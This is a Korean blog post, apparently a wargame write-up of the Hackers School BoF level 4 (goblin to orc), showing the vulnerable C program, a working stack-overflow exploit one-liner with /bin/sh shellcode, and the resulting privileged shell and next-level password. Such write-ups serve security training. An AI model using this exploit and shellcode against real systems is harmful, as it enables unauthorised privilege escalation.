---
layout: post
title: "[Wargame] 해커스쿨 BoF LEVEL4 (goblin -> orc) : egghunter"
date: 2015-11-06 23:30
comments: true
categories:  wargame
tags: [bof]
---

- id = goblin 
- pw = hackers proof

<!--more-->

처음에는 egghunter 의 의미를 잘 몰랐다가 [이 글](https://kldp.org/node/28993)을 보니 환경 변수와 관련있는 것을 알게되었다.  결국 환경변수를 이용해서 풀 수 없도록 환경 변수 값을 모두 초기화시킨 것임.  또한 command line argument 로 입력을 하고, 그 사이즈는 **48 bytes**  위치에 `0xbf` 값이 있지 않으면 buffer copy 하기 않기 때문에 이 조건을 맞추어 주어야 한다.

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}   
```

## Exploit

```bash
[NOP 44bytes][LR][NOP 20bytes][ShellCode]

./orc `python -c 'print "\x90"*44 + "\x94\xfc\xff\xbf" + "\x90" * 20 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`
```

## Next stage

```bash
bash$ id
uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)

bash$ my-pass
euid = 504
cantata  
```